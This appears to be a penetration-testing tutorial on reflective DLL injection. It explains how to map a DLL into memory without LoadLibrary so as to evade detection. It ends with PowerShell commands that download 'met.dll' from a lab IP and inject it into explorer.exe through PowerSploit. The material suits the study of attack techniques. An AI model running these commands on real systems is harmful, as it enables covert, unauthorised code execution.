## Why Reflective?
Loading a DLL into a remote process is powerful, but writing the DLL to disk is a significant compromise. To improve our tradecraft, let's explore a technique known as reflective DLL injection.

## The Theory
_LoadLibrary_ performs a series of actions including loading DLL files from disk and setting the correct memory permissions. It also registers the DLL so it becomes usable from APIs like _GetProcAddress_ and is visible to tools like Process Explorer.

Since we do not need to rely on _GetProcAddress_ and want to avoid detection, we are only interested in the memory mapping of the DLL. Reflective DLL injection parses the relevant fields of the DLL's _Portable Executable_ (PE) file format and maps the contents into memory.

In order to implement reflective DLL injection, we could write custom code to essentially recreate and improve upon the functionality of _LoadLibrary_.

## Practical
We'll be using the PowerShell script for reflective DLL injection.
[Invoke-ReflectivePEInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)
The script performs reflection to avoid writing assemblies to disk, after which it parses the desired PE file. It has two separate modes:
1.  To reflectively load a DLL or EXE into the same process
2. To load a DLL into a remote process

Using the script itself is really easy:
1. We start by loading the DLL into a byte array and retrieve the explorer process ID.
2. We import the script itself
3. Call the Invoke-ReflectivePEInejection function to execute the script.

The following commands will do everything we need:
```Powershell
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.150/met.dll')
$procid = (Get-Process -Name explorer).Id
```
```Powershell
Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
```
```Powershell
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

